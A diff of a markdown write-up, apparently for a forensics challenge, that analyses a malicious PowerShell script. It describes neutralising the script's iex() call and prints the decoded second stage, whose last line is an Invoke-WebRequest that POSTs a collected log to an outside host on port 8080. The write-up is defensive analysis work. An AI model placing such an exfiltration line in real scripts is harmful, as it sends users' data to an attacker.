@@ -36,8 +36,10 @@ At this point it was confirmed that this was the malicious script that was ran w
 ### Downloading the Data
 
 From the Task's description, we needed to go farther to discover a domian that the script was sending a POST request to. The only option to get there was to execute this script, but we don't want to make a call to the malicious actor's endpoint, so a modified script needed to be made to mimick the real script's functionality. This called for two steps: one, getting the endpoint data without making and HTTP call and two, changing the scipt to not execute the mystery code that is being downloaded. Luckily for us, the first step was already solved as the data from the request was captured in the .pcap file from Task 1 as seen below. 
+
 ![image](https://user-images.githubusercontent.com/94944325/145699900-e5d7dc08-488b-4039-83a8-646b5660a5a5.png)
-Now that we got the data downloaded from the malicious actor's domain, we needed to modify the script to make sure no malicious code was execute on our machine. As seen in the last line of the script above, there is an iex() function being used. This function executes a string (presumably malware) constructed in the for-loop above. Our new script needed to remove that functionality and instead print the string that is attempting to be executed. The modified script is seen below, along with the output when runnning it. Note the $hexString variable containing the data from the GET request is left out as it is over 12,000 bytes.
+
+Now that we got the data downloaded from the malicious actor's domain, we needed to modify the script to make sure no malicious code was execute on our machine. As seen in the last line of the script above, there is an *iex()* function being used. This function executes a string (presumably malware) constructed in the for-loop above. Our new script needed to remove that functionality and instead print the string that is attempting to be executed. The modified script is seen below, along with the output when runnning it. **Note the $hexString variable containing the data from the GET request is left out as it is over 12,000 bytes.**
 
 ```
 $hexString = ''
@@ -59,3 +61,17 @@ Write-Output $dec
 [System.Text.Encoding]::UTF8.GetString($dec)
 pause
 ```
+Output of the script
+
+```
+$global:log = ""
+...
+...
+...
+Invoke-WebRequest -uri http://rlwmw.invalid:8080 -Method Post -Body $global:log
+```
+**Note: The guts of this script was left out for the sake of this file's readability. The script will be explored in Task 4**
+
+### Finding the POST
+
+After running our modified script, we found that there was yet another script constructed and executed from the downloaded data. The extent of this task required us to find the POST request and lo and behold, that request is seen in the last line of the script, POSTing data to *http://rlwmw.invalid:8080*
